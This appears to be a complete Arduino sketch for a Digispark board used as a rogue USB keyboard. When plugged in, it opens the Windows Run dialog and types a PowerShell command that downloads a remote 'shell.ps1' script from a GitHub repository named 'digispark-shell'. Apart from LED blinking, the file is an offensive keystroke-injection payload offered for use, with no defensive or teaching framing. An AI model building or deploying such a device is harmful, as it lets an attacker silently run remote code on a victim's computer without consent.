#include "DigiKeyboardPtBr.h"

void setup()
{
    pinMode(1, OUTPUT);
    ledBlink(5);

    DigiKeyboardPtBr.delay(300);
    DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    ledBlink(8);

    DigiKeyboardPtBr.println("powershell (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Louie-Cipher/digispark-shell/master/shell.ps1')");
}

void loop()
{
    ledBlink(10);
}

void ledBlink(int times)
{
    for (int i = 0; i < times; i++)
    {
        digitalWrite(1, HIGH);
        DigiKeyboardPtBr.delay(250);
        digitalWrite(1, LOW);
        DigiKeyboardPtBr.delay(250);
    }
}